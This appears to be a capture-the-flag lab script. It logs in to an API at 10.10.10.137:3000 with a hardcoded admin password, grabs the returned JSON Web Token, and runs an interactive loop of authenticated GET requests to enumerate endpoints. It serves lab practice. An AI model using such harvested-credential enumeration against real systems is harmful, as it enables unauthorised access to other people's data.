import requests as r

target = "http://10.10.10.137:3000"
session = r.Session()

# ===EXTRACTING-THE-JSON-WEBTOKEN===================================

headers = { "Content-Type": "application/json" }
data = {
    "username": "admin",
    "password": "Zk6heYCyv6ZE9Xcg"
}
login = session.post(target+"/login", headers=headers, json=data)
try:
    token = login.json()["token"]
    print("\n[JSON WEB TOKEN]\n\n" + token + "\n")
except:
    print("\nNO TOKEN FOUND\n")
    exit()

# ===AUTHENTICATION-AND-ENUMERATION-ON-PORT-3000====================

headers = {
    "Accept": "application/json",
    "Authorization": "Bearer " + token
}
print("[HTTP GET REQUESTS @ 10.10.10.137:3000]\n")
while True:
    get = input("GET /")
    try:
        users = session.get(target+"/"+get, headers=headers)
        
        switch = {
            "<class 'str'>": lambda x: print("   ", x),
            "<class 'dict'>": lambda x: print("   ", x),
            "<class 'list'>": lambda x: [print("   ", i) for i in x]
        } [str(type(users.json()))] (users.json())
    except:
        print("    Cannot GET /"+ get)
